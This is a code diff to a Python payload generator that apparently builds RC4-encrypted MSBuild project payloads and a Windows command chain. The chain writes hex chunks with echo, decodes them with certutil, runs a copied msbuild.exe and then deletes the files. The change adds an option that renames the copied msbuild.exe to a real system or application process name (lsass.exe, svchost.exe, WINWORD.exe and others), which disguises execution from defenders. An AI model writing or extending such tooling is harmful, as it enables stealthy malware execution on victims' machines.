@@ -9,6 +9,7 @@ import os
 
 TEMPLATE = "include/template.csproj"
 IS_CMD_ARGS = False
+USE_KNOWN_PROCESS_NAME = False
 
 class Generator:
 
@@ -45,6 +46,10 @@ class Generator:
 	def gen_str(self, size):
 		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
 
+	def gen_process(self):
+		name = ["csrss.exe","explorer.exe","iexplorer.exe","firefox.exe","chrome.exe","lsass.exe","services.exe","smss.exe","spoolsv.exe","svchost.exe","winlogon.exe","wininit.exe","taskmgr.exe","conhost.exe","OUTLOOK.exe", "WINWORD.exe", "EXCEL.exe"]
+		return name[random.randrange(0, len(name) - 1)]
+		
 	def rand_vars(self):
 		for i in reversed(range(1, 31)):
 			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
@@ -100,7 +105,10 @@ class Generator:
 		if len(data) > size:
 			payload += "echo %s >> %s" % (data[(len(data) - size) * -1:], filepath[0])
 
-		msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
+		if USE_KNOWN_PROCESS_NAME:
+			msbuild = self.gen_process()
+		else:
+			msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
 		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1])
 		return payload
 
@@ -137,9 +145,10 @@ class RC4:
 		
 if __name__ == "__main__":
 	
-	if len(sys.argv) == 3:
+	if len(sys.argv) >= 3:
 		IS_CMD_ARGS = True
-
+		if "-knownprocess" in sys.argv:
+			USE_KNOWN_PROCESS_NAME = True
 	try:
 		gen = Generator(TEMPLATE)
 		rc4 = RC4()
@@ -160,6 +169,11 @@ if __name__ == "__main__":
 		except:
 			gen.print_error("Failed to write the output to %s" % outfile)
 
+		if not IS_CMD_ARGS:
+			answer = gen.capture_input("Use known process name to perform MsBuild renaming (Default: False)").lower()
+			if answer == "true":
+				USE_KNOWN_PROCESS_NAME = True
+			
 		outcmd = gen.gen_final_cmd(outfile)
 		try:
 			open(outfile + ".cmd", "wb").write(outcmd)
